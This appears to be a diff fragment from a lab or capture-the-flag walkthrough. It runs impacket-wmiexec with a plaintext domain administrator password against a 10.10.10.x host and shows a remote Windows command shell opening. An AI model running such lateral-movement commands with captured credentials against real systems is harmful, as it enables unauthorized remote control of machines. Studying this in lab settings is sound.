@@ -1,0 +1,8 @@
+impacket-wmiexec active/administrator:Ticketmaster1968@10.10.10.100
+
+Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation
+
+[*] SMBv2.1 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>
